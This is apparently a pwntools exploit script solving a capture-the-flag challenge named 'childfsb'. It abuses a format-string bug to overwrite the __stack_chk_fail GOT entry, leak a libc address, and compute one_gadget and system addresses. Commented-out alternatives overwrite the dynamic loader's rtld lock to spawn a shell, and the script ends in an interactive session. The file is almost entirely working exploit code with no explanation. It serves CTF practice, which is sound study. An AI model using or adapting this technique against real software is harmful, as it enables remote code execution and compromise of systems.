#!/usr/bin/python 
from pwn import *
from koharin import *

context.log_level = 'debug'
#p = remote("ctf.j0n9hyun.xyz", 3037)
p = process("./childfsb")
elf = ELF("./childfsb")
#libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
one_gadget_off = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
main = elf.symbols['main']
stack_chk_fail_got = elf.got['__stack_chk_fail']
libc_start_main_got = elf.got['__libc_start_main']
libc_start_main_plt = elf.plt['__libc_start_main']

# offset 6

# _stack_chk_fail -> main && libc leak
pay = fsb64(6, stack_chk_fail_got, main & 0xffff, 1)
pay += 'A'*(0x19-len(pay))

p.sendafter("hello\n", pay)
pause()

pay = '%17$p'
pay += 'A'*(0x19-len(pay))

p.sendafter("hello\n", pay)


# libc leak
p.recvuntil("0x")
leak = int('0x' + p.recv(12), 16)
log.info("__libc_start_main+240 : "+hex(leak))
libcBase = leak - libc.sym['__libc_start_main'] - 240
log.info("libcBase : "+hex(libcBase))
one_gadget = libcBase + one_gadget_off[3]
log.info("one_gadget : "+hex(one_gadget))
rtld = libcBase + 0x5f0f48
rtld_sh = libcBase + 0x5f0948
system = libcBase + libc.symbols['system']
pause()
'''
# 2. rtld lock -> sh system('sh')
pay = fsb64(6, rtld, system, 1)
pay += 'A'*(0x19-len(pay))
p.sendafter("hello\n", pay)

pay = fsb64(6, rtld+2, system>>16, 1)
pay += 'A'*(0x19-len(pay))
p.sendafter("hello\n", pay)

pay = fsb64(6, rtld_sh, int('hs'.encode("hex"), 16), 1)
p.sendafter("hello\n", pay)
# sh.encode("Hex")
'''
'''
# 1. rtld overwrite
pay = fsb64(6, rtld, one_gadget, 1)
pay += 'A'*(0x19-len(pay))
p.sendafter("hello\n", pay)

pay = fsb64(6, rtld+2, one_gadget >> 16, 1)
p.sendafter("hello\n", pay)
'''


p.interactive()

